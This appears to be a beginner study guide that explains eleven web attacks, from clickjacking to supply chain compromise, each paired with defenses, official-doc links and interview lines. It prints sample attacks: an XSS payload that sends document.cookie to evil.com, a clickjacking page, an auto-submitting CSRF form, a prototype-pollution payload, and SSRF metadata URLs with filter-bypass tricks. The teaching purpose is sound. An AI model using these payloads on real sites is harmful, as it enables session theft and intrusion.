# 04 — Web Attacks, Explained Like a Beginner (but Deep)

> For each attack: **what it is → how it works (flow) → when it happens → why it works → how to stop it → official docs.**
> ← [README](../README.md) · ← [03 System design](./03-system-design-auth.md) · → [05 Defenses & threat modeling](./05-defenses-and-threat-modeling.md)

Every section ends with an **Official docs** link. The MDN links come from MDN's own
[Attacks index](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks).

---

## 0. Before the attacks — three ideas that explain almost everything

### Idea 1 — The browser attaches your cookies automatically
If you are logged in to `bank.com`, **any** request to `bank.com` — even one triggered by `evil.com` — carries your `bank.com` cookies. This one behavior powers CSRF, clickjacking, XS-Leaks.

### Idea 2 — The Same-Origin Policy (SOP) is the browser's wall
An **origin** = `scheme + host + port`. Page from `https://evil.com` **cannot read** responses from `https://bank.com`. But it **can send** requests to it (the wall blocks *reading*, not *sending*). That gap is why CSRF exists.

### Idea 3 — Your own JavaScript is fully trusted
Any script running on your origin can do anything your app can. So attacks that get *their* code to run as *your* code (XSS, supply chain, subdomain takeover) are the most severe.

### Quick map

| Attack | Attacker's trick | What they get |
|---|---|---|
| Clickjacking | Hide your site in an invisible iframe | Victim's **click** |
| XS-Leaks | Measure side-effects across sites | **Information** about victim's state |
| CSRF | Make the browser send a request with cookies | A **forged action** |
| XSS | Run script inside your page | **Everything** your JS can do |
| IDOR | Change an ID in the request | **Other users' data** |
| Prototype pollution | Poison `Object.prototype` | Logic bypass → XSS/RCE |
| MITM | Sit on the network path | Read/modify **traffic** |
| Phishing | Fake login page | **Credentials / sessions** |
| SSRF | Make *your server* call internal URLs | Internal network / cloud keys |
| Subdomain takeover | Claim an abandoned subdomain | Trusted-domain foothold |
| Supply chain | Poison a dependency | Code execution inside your app |

---

## 1. Clickjacking

**One-liner:** The attacker frames your site invisibly and tricks the user into clicking *your* buttons while they think they click something else.

### How it works

```text
attacker.com page                     what the user sees        what is really there
┌──────────────────────┐             ┌──────────────────┐      ┌──────────────────────┐
│ "Click to win a      │             │  🎁 WIN A PRIZE  │      │ <iframe bank.com     │
│  prize!"  [Claim]    │    ─────▶   │     [Claim]      │      │  opacity:0 >         │
│  (decoy button)      │             └──────────────────┘      │  [Delete account]    │ ← aligned
└──────────────────────┘                                       └──────────────────────┘   under the decoy
```

```html
<!-- attacker's page -->
<style>iframe{position:absolute;opacity:0.0001;top:0;left:0;width:500px;height:300px;z-index:2}</style>
<button style="position:absolute;top:120px;left:80px">Claim prize</button>
<iframe src="https://bank.com/settings/delete-account"></iframe>
```

### When it happens
- A page allows being framed (default behavior!) **and**
- It has a sensitive one-click action (delete, transfer, follow, "Allow" on an OAuth consent screen) **and**
- The user is logged in (the iframe request carries cookies).

### Why it works
Browsers allow any site to embed any other site unless the target says no. The click is *real* — it is the user's genuine click on a hidden element.

### Defenses
1. **`Content-Security-Policy: frame-ancestors 'none'`** (or `'self'`) — the modern, flexible control.
2. **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) — legacy fallback, send both.
3. **`SameSite=Lax/Strict` cookies** — cookies are not sent on cross-site iframe requests, so the framed page loads logged-out.
4. Re-authentication / confirmation for destructive actions.
5. JS "frame-busting" is **unreliable** — don't depend on it.

```js
// Express
app.use(helmet({ frameguard: { action: "deny" } }));
app.use(helmet.contentSecurityPolicy({ directives: { "frame-ancestors": ["'none'"] } }));
```

**Interview line:** "Clickjacking is UI redressing; I stop it with `frame-ancestors`, back it with SameSite cookies, and require confirmation for dangerous actions."

📖 [MDN – Clickjacking](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Clickjacking) · [OWASP – Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

---

## 2. Cross-site leaks (XS-Leaks)

**One-liner:** The attacker's page cannot *read* your site, but it can *measure side effects* (timing, errors, frame counts, cache state) to infer private facts about the logged-in user.

### How it works — a simple example

Your site has `GET /search?q=<term>` that searches the **logged-in user's private emails**. Result page exists → `200`, no result → `404`.

```text
evil.com runs, in the victim's browser:
   <img src="https://mail.com/search?q=cancer-diagnosis"  onload=YES  onerror=NO>
        │  cookies are attached automatically
        ▼
   mail.com returns 200 (matches found)  → image "loaded" event fires? / or error fires
        ▼
   evil.com learns: "this user has an email containing 'cancer-diagnosis'"
```

No data was *read*. The attacker only observed **different behavior** for different states (loaded vs error, fast vs slow, 1 frame vs 0 frames, cached vs not).

### Common leak channels
| Channel | Example |
|---|---|
| Error events | `<img>/<script>` load vs error reveals status code differences |
| Timing | Slow response = more data / heavier DB query |
| Frame counting | `window.length` of an opened window = number of iframes shown for that state |
| Cache probing | Is a resource already in the victim's cache (they visited it)? |
| Redirects / history length | Different state redirects differently |

### When it happens
Search endpoints, "is user X following Y", "does this account exist", any page whose **response differs by the victim's private state**, and cookies are sent cross-site.

### Defenses
1. **`SameSite=Lax/Strict`** cookies — cross-site probes arrive logged-out and look identical.
2. **Fetch Metadata** — reject suspicious cross-site, non-navigation requests:
   ```js
   app.use((req, res, next) => {
     const site = req.get("sec-fetch-site");
     const mode = req.get("sec-fetch-mode");
     if (site === "cross-site" && mode !== "navigate") return res.sendStatus(403);
     next();
   });
   ```
3. **`Cross-Origin-Opener-Policy: same-origin`** — cuts the link between your window and a window that opened it.
4. **`Cross-Origin-Resource-Policy: same-origin`** — resources can't be embedded cross-site.
5. `frame-ancestors`, `Cache-Control: no-store` on sensitive pages, avoid state-dependent status codes on endpoints a third party can trigger.

**Interview line:** "XS-Leaks are information leaks via observable differences, not data theft; SameSite cookies, Fetch Metadata and COOP/CORP break the channel."

📖 [MDN – XS-Leaks](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XS-Leaks) · [XS-Leaks community wiki](https://xsleaks.dev/)

---

## 3. Cross-Site Request Forgery (CSRF)

**One-liner:** The attacker makes the victim's browser send a **real, cookie-authenticated** request that the victim never intended.

### How it works

```text
1. Victim logs in to bank.com          →  browser stores  sid=abc  cookie
2. Victim opens evil.com (other tab)
3. evil.com contains:
      <form action="https://bank.com/transfer" method="POST" id="f">
        <input name="to"     value="attacker">
        <input name="amount" value="10000">
      </form>
      <script>f.submit()</script>
4. Browser sends POST to bank.com  +  Cookie: sid=abc   (automatic!)
5. bank.com sees valid session → performs transfer
```

The attacker **never saw** the cookie. They only *caused* the request.

### Three conditions (all must be true)
1. Authentication is **automatic** (cookies / HTTP auth), not manually added (like `Authorization` header).
2. The action **changes state** (transfer, change email, delete).
3. The attacker can **predict all parameters** (no unguessable value required).

> **Why bearer tokens in a header are naturally CSRF-safe:** the browser does not attach `Authorization` automatically; attacker's page can't add it.

### When it happens
Cookie sessions, cookie-based refresh endpoints, GET requests that change state (`/delete?id=1`), apps with `SameSite=None`, subdomain-shared cookies.

### Defenses (layer them)

| Defense | How |
|---|---|
| **SameSite cookies** | `Strict` (never sent cross-site) or `Lax` (sent only on top-level GET navigations). Primary modern defense. |
| **Never change state with GET** | Because `Lax` cookies still ride top-level GET navigations |
| **CSRF token (synchronizer)** | Server generates random token per session; embedded in forms/headers; verified on each unsafe request |
| **Double-submit cookie** (signed) | Same random value in a cookie **and** a header; server compares (use signed/HMAC variant) |
| **Custom header requirement** | `X-Requested-With`/`X-CSRF-Token` — forces a CORS preflight attackers can't pass |
| **Origin / Referer check** | Reject if `Origin` isn't your site |
| **Fetch Metadata** | Reject `Sec-Fetch-Site: cross-site` on state-changing routes |
| **Re-auth for sensitive actions** | Passkey/password re-entry |

```js
// Synchronizer token sketch (server-side session)
const token = crypto.randomBytes(32).toString("hex");
req.session.csrf = token;                       // store server-side
// client sends  X-CSRF-Token: <token>  with every POST/PUT/DELETE
if (req.get("x-csrf-token") !== req.session.csrf) return res.sendStatus(403);
```

**Gotchas:**
- "My API only accepts JSON, so I'm safe" — **not guaranteed**; don't rely on content type alone.
- CORS is **not** CSRF protection. CORS controls *reading* responses; the forged request is still *sent*.
- Login CSRF exists too: attacker logs the victim into the *attacker's* account.

**Interview line:** "CSRF abuses automatic credential attachment. XSS steals or uses the credential; CSRF only forces a request."

📖 [MDN – CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF) · [OWASP – CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## 4. Cross-Site Scripting (XSS)

**One-liner:** Attacker-controlled text is put into your page in a way that the browser **executes it as code** — inside **your** origin.

### Three types

```text
REFLECTED   payload in the URL → server echoes it → victim clicks link
            https://shop.com/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>

STORED      payload saved in DB (comment, profile, README) → every visitor runs it
            Comment: <img src=x onerror="/* attacker code */">

DOM-BASED   server is fine; client JS writes untrusted data into a dangerous sink
            el.innerHTML = location.hash.slice(1)
```

### What the attacker can do (all as the victim)
- Read anything JS can read: `localStorage`, non-HttpOnly cookies, page content, in-memory tokens
- **Send authenticated requests** (`fetch("/api/transfer")`) — HttpOnly cookies don't help here
- Log keystrokes, show a fake login box, change page content, redirect
- Spread (worm) by posting itself to other users

> **HttpOnly doesn't stop XSS.** It stops *reading* the cookie. The script can still *use* the session.

### When it happens — dangerous sinks

| Sink | Why dangerous |
|---|---|
| `innerHTML`, `outerHTML`, `document.write` | Parses HTML + runs handlers |
| React `dangerouslySetInnerHTML`, Vue `v-html`, Svelte `{@html}` | Frameworks escape by default; these bypass it |
| `eval`, `new Function`, `setTimeout("string")` | Executes strings |
| `<a href={userInput}>` | `javascript:alert(1)` URLs |
| Rendering user Markdown/HTML | Markdown can contain raw HTML |
| Templates with unescaped output (`<%- %>`, `{{{ }}}`) | No encoding |

**Example from a real project type:** rendering GitHub READMEs. `react-markdown` is safe by default; adding `rehype-raw` (to allow raw HTML) **without** `rehype-sanitize` turns every malicious README into stored XSS.

```jsx
// ❌ unsafe: raw HTML allowed, no sanitizer
<ReactMarkdown rehypePlugins={[rehypeRaw]}>{readme}</ReactMarkdown>

// ✅ safe: sanitize AFTER raw
<ReactMarkdown rehypePlugins={[rehypeRaw, rehypeSanitize]}>{readme}</ReactMarkdown>
```

### Defenses (defense in depth)
1. **Output-encode for the context** (HTML body vs attribute vs JS vs URL). Use framework defaults.
2. **Avoid dangerous sinks.** Prefer `textContent`.
3. **Sanitize** when HTML is genuinely required: `DOMPurify.sanitize(html)`.
4. **Content Security Policy** — nonce-based, blocks inline/injected scripts:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
   ```
5. **Trusted Types** — browser refuses to feed raw strings into dangerous sinks.
6. Validate URL schemes (`http/https` only) for user-supplied links.
7. `HttpOnly` cookies + short-lived tokens — reduce *damage*, not the bug.
8. `X-Content-Type-Options: nosniff`.

**Interview line:** "Fix XSS at output with encoding and safe sinks; CSP and Trusted Types are the safety net, HttpOnly only limits what can be stolen."

📖 [MDN – XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS) · [MDN – Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) · [OWASP – XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

## 5. Insecure Direct Object Reference (IDOR / BOLA)

**One-liner:** The app trusts an ID the client sends and never checks "does this object belong to *you*?"

### How it works

```text
You (user 7) open:      GET /api/invoices/1001      → your invoice ✅
You edit the URL:       GET /api/invoices/1002      → someone else's invoice 😱
Then script it:         for id in 1..100000: GET /api/invoices/{id}   → mass data theft
```

The user **is authenticated**. The failure is **authorization**.

### Vulnerable vs fixed

```js
// ❌ authenticated but no ownership check
app.get("/api/invoices/:id", isLoggedIn, async (req, res) => {
  res.json(await Invoice.findById(req.params.id));
});

// ✅ ownership enforced inside the query
app.get("/api/invoices/:id", isLoggedIn, async (req, res) => {
  const inv = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
  if (!inv) return res.sendStatus(404);          // 404 hides existence
  res.json(inv);
});
```

### Where IDs hide (check all)
URL path, query string, JSON body, headers, cookies, GraphQL arguments, file names/paths (`/files/report_42.pdf`), "signed" URLs that never expire, WebSocket messages, bulk endpoints (`ids=1,2,3`).

### Related
- **BOLA** — OWASP API Top 10 name for IDOR (object level).
- **BFLA** — *function-level*: normal user can call `POST /admin/users`.
- **Mass assignment** — body contains `{"role":"admin"}` or `{"userId":"other"}` and the server blindly saves it.

### Defenses
1. **Authorize every object access** — check ownership/tenant/permission in the **data query**.
2. **Deny by default**, centralize policy (middleware / policy library like CASL, Casbin).
3. Use the identity from `req.user`, never from request body.
4. Random UUIDs are **defense in depth only** — unguessable ≠ authorized.
5. Allow-list fields on update (DTO/schema) to stop mass assignment.
6. **Test with two accounts**: replay A's requests using B's token.
7. Rate-limit and alert on sequential ID scanning.

**Interview line:** "IDOR is broken authorization, not broken authentication — RBAC alone can't fix it; I add per-object checks in the query."

📖 [MDN – IDOR](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/IDOR) · [OWASP – IDOR Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) · [OWASP – Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)

---

## 6. JavaScript Prototype Pollution

**One-liner:** The attacker adds properties to `Object.prototype`, so **every object** in the app suddenly inherits attacker-chosen values.

### Background: the prototype chain

```js
const user = { name: "A" };
user.isAdmin            // undefined → JS looks at user, then user.__proto__ (Object.prototype)
Object.prototype.isAdmin = true;
user.isAdmin            // true   ← inherited!  (every object, everywhere)
```

### How it works — the vulnerable merge

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = target[key] || {};
      merge(target[key], source[key]);      // recursion
    } else {
      target[key] = source[key];
    }
  }
}

// attacker sends JSON body
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, payload);

({}).isAdmin;   // true  ← all objects now "admin"
```

Flow: `merge({}, payload)` → key `"__proto__"` → `target["__proto__"]` **is** `Object.prototype` → recursion writes `isAdmin` onto it.

### Impact
- **Logic bypass:** `if (user.isAdmin)` becomes true for everyone.
- **DoS:** polluting `toString`/`hasOwnProperty` crashes the app.
- **Client side → XSS:** pollute a property a library later puts into `innerHTML`/script `src` ("gadgets").
- **Server side → RCE:** pollute options consumed by `child_process`, template engines, etc. (real, researched chains).

### When it happens
Deep merge/clone/`set(obj, path, value)` utilities fed with user JSON, query-string parsers (`a[__proto__][x]=1`), old versions of popular libraries (lodash had several, e.g. CVE-2019-10744; jQuery `$.extend(true, …)`, minimist).

### Defenses
1. **Block dangerous keys** in any recursive merge: `__proto__`, `constructor`, `prototype`.
2. Use **`Object.create(null)`** or **`Map`** for dictionaries of user keys.
3. **Schema-validate input** and reject unknown keys (`zod.strict()`).
4. Check own properties: `Object.hasOwn(obj, key)`.
5. **Update dependencies** (`npm audit`, Dependabot).
6. Node flag `--disable-proto=delete`; `Object.freeze(Object.prototype)` at startup (test for breakage).

```js
const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);
for (const key of Object.keys(source)) {
  if (FORBIDDEN.has(key)) continue;
  // ...
}
```

**Interview line:** "Prototype pollution is untrusted keys writing into `Object.prototype` through unsafe recursive assignment; I block the keys, use null-prototype objects, validate schemas, and keep dependencies patched."

📖 [MDN – Prototype pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution) · [OWASP – Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

---

## 7. Manipulator in the Middle (MITM)

**One-liner:** Someone sits **between browser and server** and can read or change the traffic.

### How it works

```text
Victim ───HTTP──▶ [ Attacker on same Wi-Fi / rogue hotspot / compromised router ] ───▶ Server
                         │ reads: cookies, passwords, tokens
                         │ modifies: injects <script>, swaps download links
```

### Ways the attacker gets in the middle
- Public/rogue Wi-Fi, "Evil Twin" hotspot
- ARP spoofing on a local network
- DNS spoofing/poisoning (victim is sent to the wrong IP)
- Compromised router/ISP/proxy, malicious corporate proxy with an installed root CA
- **SSL stripping:** victim types `bank.com`, first request is plain HTTP and attacker keeps them on HTTP

### When it happens
- Site (or any part of it) served over **HTTP**
- **Mixed content** (HTTPS page loading an HTTP script)
- No **HSTS** (browser doesn't force HTTPS)
- Users click through certificate warnings
- Your own code disables verification (`rejectUnauthorized: false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`) ← common developer mistake

### Defenses
1. **HTTPS (TLS) everywhere**, modern TLS versions.
2. **HSTS:** `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
3. **`Secure` cookies** so cookies never travel over HTTP.
4. **No mixed content**; use SRI for third-party scripts.
5. **Never disable certificate validation** in backend HTTP clients.
6. **Certificate Transparency** monitoring + **CAA** DNS records to limit who can issue certs for your domain.
7. Mobile apps: consider certificate pinning (with a rotation plan).
8. Encrypted DNS (DoH/DoT), DNSSEC where applicable.

**Interview line:** "TLS gives confidentiality, integrity, and server authentication; HSTS and Secure cookies make sure the browser never falls back to plain HTTP."

📖 [MDN – MITM](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/MITM) · [MDN – Transport Layer Security](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Transport_Layer_Security) · [MDN – Mixed content](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Mixed_content) · [MDN – Certificate Transparency](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Certificate_Transparency)

---

## 8. Phishing

**One-liner:** Social engineering — the user is tricked into entering credentials on a **fake site**.

### How it works

```text
1. Email/SMS: "Unusual login detected. Verify now: https://g00gle-security.com/login"
2. Victim sees a pixel-perfect copy of the real login page
3. Victim types email + password (+ OTP)
4. Fake site forwards them to the attacker (and often to the real site)
```

### Variants
| Variant | Idea |
|---|---|
| **Spear phishing** | Targeted, uses personal details |
| **Adversary-in-the-Middle (AiTM) proxy** | Fake site relays traffic to the real site live, **captures the session cookie after MFA** — defeats SMS/TOTP |
| **OAuth consent phishing** | Malicious app asks "Allow access to your mail?" — no password needed |
| **Look-alike domains** | `paypa1.com`, Unicode homographs |
| **Smishing/vishing** | SMS / phone call versions |
| **Open-redirect abuse** | Link starts on your real domain, then bounces to attacker |

### Why it works
It attacks the **human**, not the cryptography. TLS shows a valid padlock on the attacker's domain too.

### Defenses
1. **Passkeys / WebAuthn / security keys** — credentials are bound to the real origin; the fake domain simply **cannot** use them. This is the strongest fix.
2. **Password managers** — autofill by exact domain; they don't fill on look-alikes.
3. **Phishing-resistant MFA** over SMS/TOTP.
4. **Email authentication:** SPF, DKIM, **DMARC** to stop spoofing of your domain.
5. Short sessions, device-bound tokens, new-device alerts; users can review and revoke sessions.
6. Fix **open redirects**; whitelist redirect targets.
7. Verify OAuth apps, show clear consent screens, least-privilege scopes.
8. Domain monitoring, takedown process, user education.

**Interview line:** "Phishing steals credentials by impersonation; origin-bound passkeys make the stolen secret useless because it cannot be replayed on another domain."

📖 [MDN – Phishing](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Phishing) · [MDN – Passkeys](https://developer.mozilla.org/en-US/docs/Web/Security/Authentication/Passkeys)

---

## 9. Server-Side Request Forgery (SSRF)

**One-liner:** The attacker makes **your server** send a request to a destination of their choice — often places only the server can reach.

### How it works

Feature: "paste a URL, we fetch a preview / detect its tech stack / import an image."

```js
// ❌ vulnerable
app.get("/preview", async (req, res) => {
  const r = await fetch(req.query.url);          // attacker controls the target
  res.send(await r.text());
});
```

```text
Attacker: GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
              │
              ▼
Your server (inside the cloud network) fetches the cloud METADATA service
              ▼
Returns temporary cloud credentials → attacker uses them to read storage, DBs ...
```

Other targets: `http://localhost:6379` (Redis), `http://127.0.0.1:8080/admin`, internal microservices, databases, `file://` and `gopher://` on weak clients.

### Why it works
Your server sits **inside** the trusted network: firewalls allow it to reach internal services and the cloud metadata endpoint. The attacker borrows that position. A famous real incident: the 2019 Capital One breach used SSRF against the AWS metadata service to obtain credentials.

### Bypass tricks attackers use
- Alternate IP forms: `http://2130706433/`, `http://0x7f000001/`, `http://127.1/`, `http://[::1]/`, `http://0.0.0.0/`
- **DNS rebinding:** hostname resolves to a public IP during validation, then to `127.0.0.1` when the request is made
- **Redirects:** `https://good.com/r` → `302` → `http://169.254.169.254/`
- URL parser confusion (`http://allowed.com@evil.com/`)
- Short URLs, IPv4-mapped IPv6 (`::ffff:127.0.0.1`)

### When it happens
URL preview, link unfurling, webhook testers, "import from URL", image proxies, PDF/screenshot generators, **website tech-stack detectors**, SSO metadata fetchers.

> If you build a "paste any website URL → detect its stack" feature (like a Wappalyzer-style tool), you are building an SSRF target. Treat URL fetching as the highest-risk part of the design.

### Defenses (layered)
1. **Allow-list** destinations whenever possible.
2. If arbitrary public URLs are required:
   - Only `http`/`https`.
   - **Resolve DNS yourself**, reject loopback, private, link-local, metadata, and reserved ranges (IPv4 **and** IPv6).
   - **Connect to the validated IP** (don't resolve twice → stops rebinding).
   - **Re-validate every redirect hop** or disable redirects.
   - Timeouts, max response size, limit content types.
3. **Network isolation:** run the fetcher in a locked-down subnet with **egress firewall** or an allow-listing forward proxy; no route to internal services.
4. Cloud: enforce **IMDSv2** (token-required metadata), least-privilege instance roles.
5. Don't return raw upstream responses/errors to the user.
6. Authenticate internal services too (don't trust "it came from inside").

```js
// Validation helper (sketch) — validate, then connect to the validated address
const { BlockList } = require("net");
const dns = require("dns/promises");

const blocked = new BlockList();
[["10.0.0.0",8],["172.16.0.0",12],["192.168.0.0",16],["127.0.0.0",8],
 ["169.254.0.0",16],["0.0.0.0",8],["100.64.0.0",10]].forEach(([a,p]) => blocked.addSubnet(a,p,"ipv4"));
blocked.addAddress("::1","ipv6");
blocked.addSubnet("fc00::",7,"ipv6");
blocked.addSubnet("fe80::",10,"ipv6");

async function assertPublicHttpUrl(raw) {
  const url = new URL(raw);
  if (!["http:", "https:"].includes(url.protocol)) throw new Error("Protocol not allowed");
  const addrs = await dns.lookup(url.hostname, { all: true });
  for (const { address, family } of addrs) {
    if (blocked.check(address, family === 6 ? "ipv6" : "ipv4")) throw new Error("Blocked address");
  }
  return { url, addrs };      // next: connect to addrs[0] explicitly; don't let the HTTP client re-resolve
}
```
Validation alone is not enough (rebinding, IPv4-mapped IPv6, redirects) — pair it with network egress controls.

**Interview line:** "SSRF turns my server into the attacker's proxy into the internal network; I allow-list or validate resolved IPs, pin the connection, control redirects, isolate egress, and enforce IMDSv2."

📖 [MDN – SSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF) · [OWASP – SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## 10. Subdomain takeover

**One-liner:** A subdomain's DNS still points to a service you stopped using — the attacker registers that service and now controls `something.yourdomain.com`.

### How it works

```text
1. You create   blog.example.com  CNAME → example-blog.github.io (or Heroku/S3/Azure/...)
2. Later you delete the GitHub Pages site / Heroku app / bucket
3. You FORGET to delete the DNS record   ← "dangling" CNAME
4. Attacker creates a new site with the same name on that provider
5. blog.example.com now serves ATTACKER'S content, under YOUR trusted domain
```

### Why it is dangerous
- **Phishing/malware** on a domain users trust.
- **Cookie theft/fixation** if your cookies use `Domain=.example.com` (they're sent to every subdomain).
- **Bypass of allow-lists**: CSP/CORS/OAuth redirect rules that trust `*.example.com`.
- Reading/sending email (dangling MX), certificate issuance for the takeover host.

### When it happens
After decommissioning cloud resources, expired trials, migrated providers, forgotten staging/marketing/landing subdomains, wildcard DNS entries.

### Defenses
1. **Order of operations:** delete the DNS record **before** (or together with) deleting the cloud resource.
2. **Inventory DNS** and run continuous checks for CNAMEs pointing at unclaimed resources (automated scanners/CI checks).
3. Use provider **domain-verification** features (TXT-record ownership) where available.
4. **Never trust `*.example.com` blindly** in CSP, CORS, OAuth redirect URIs — list exact hosts.
5. **Host-only cookies** (no `Domain` attribute) and the **`__Host-`** prefix, so subdomains can't read/overwrite session cookies.
6. Avoid wildcard DNS records unless necessary.

**Interview line:** "A dangling DNS record is an unclaimed asset; I tie DNS cleanup to resource teardown, avoid wildcard trust, and use host-only cookies so a taken subdomain can't touch sessions."

📖 [MDN – Subdomain takeover](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Subdomain_takeover) · [MDN – Secure cookie configuration](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies)

---

## 11. Supply chain attacks

**One-liner:** The attacker doesn't attack you — they poison something **you trust and install**.

### Attack vectors

```text
You ──depend on──▶ package A ──▶ package B ──▶ package C ...   (hundreds of transitive deps)
                                              ▲
                          one compromised maintainer account / one malicious release
```

| Vector | Example |
|---|---|
| **Compromised maintainer account** | Attacker takes over an npm account, publishes a malicious version |
| **Malicious/hijacked package** | New maintainer of an abandoned package adds malware |
| **Typosquatting** | `reakt` / `lodahs` installed by typo |
| **Dependency confusion** | Public package with the same name as your *private* one gets installed |
| **Install scripts** | `postinstall` runs arbitrary code on `npm install` |
| **Build/CI compromise** | Malicious GitHub Action, leaked CI token |
| **Third-party scripts / CDN** | Analytics or CDN script is changed, runs on your page |
| **Protestware / sabotage** | Maintainer intentionally breaks or harms users |

Well-known real cases: **event-stream** (2018, targeted a crypto wallet via a malicious dependency), **ua-parser-js** (2021, hijacked account published malware), **xz-utils** (2024, backdoor added by a long-game maintainer takeover; caught before wide deployment).

### Why it works
- **Transitive trust:** you review 20 dependencies, you run 1,500.
- Dependency code runs with **your app's privileges**: Node → access to env vars, filesystem, network; Browser → full access to your origin (equivalent to XSS).

### Defenses
1. **Lockfiles + `npm ci`** in CI (exact reproducible installs); commit `package-lock.json`.
2. **Pin and review updates**; delay adopting brand-new versions; use Dependabot/Renovate with review.
3. **Minimize dependencies**; prefer well-maintained, widely-used packages; check maintainers/activity.
4. `npm audit` / SCA tools; OpenSSF Scorecard to judge a package's health.
5. **`--ignore-scripts`** where feasible; run installs in sandboxes.
6. **Subresource Integrity** for CDN assets:
   ```html
   <script src="https://cdn.example/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>
   ```
7. **CSP** to limit what injected/third-party code can load and send.
8. **Scope private packages** (`@yourorg/pkg`) and configure registries to prevent dependency confusion.
9. **2FA + provenance** (npm provenance/trusted publishing) for packages you publish; least-privilege, short-lived CI secrets; pin GitHub Actions by commit SHA.
10. Keep an SBOM; have a process to rotate secrets after a suspected compromise.

**Interview line:** "Every dependency is code I execute; I reduce what I trust, pin what I install, verify integrity, and limit what any single package can access."

📖 [MDN – Supply chain attacks](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Supply_chain_attacks) · [MDN – Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity) · [OWASP – NPM Security](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)

---

## 12. How these attacks connect to authentication

| Auth asset | Threatened by | Best single defense |
|---|---|---|
| Password | Phishing, MITM, credential stuffing | Passkeys, TLS, rate limit + breached-password check |
| Access token in JS memory | XSS, supply chain | CSP, safe rendering, short TTL |
| Refresh cookie | CSRF (forced use), subdomain takeover, MITM | SameSite + Origin check, host-only/`__Host-` cookie, Secure |
| Session actions | CSRF, clickjacking | SameSite, tokens, `frame-ancestors`, step-up |
| Other users' data | IDOR | Ownership check in query |
| Internal secrets | SSRF, supply chain | Egress control, IMDSv2, least privilege |
| Server logic | Prototype pollution | Key blocking, schema validation |
| Private state facts | XS-Leaks | SameSite, Fetch Metadata, COOP/CORP |

### XSS vs CSRF vs Clickjacking — 20-second answer

```text
XSS          attacker code runs INSIDE your page      → can read AND act
CSRF         attacker site triggers a request         → can act only, can't read
Clickjacking attacker tricks the user's real click    → can act only, needs a UI trick
```

---

## ✅ Self-check

1. Why does SOP not stop CSRF?
2. Why doesn't `HttpOnly` fix XSS?
3. Why is "we use UUID ids" not an IDOR fix?
4. Why is validating a URL's hostname once not enough for SSRF?
5. Why can a bug in a `merge()` helper lead to an admin bypass?
6. Which attack is still possible after you enable MFA (TOTP)?

Answers → [06 Interview playbook](./06-interview-playbook.md). Next: [05 Defenses & threat modeling](./05-defenses-and-threat-modeling.md).
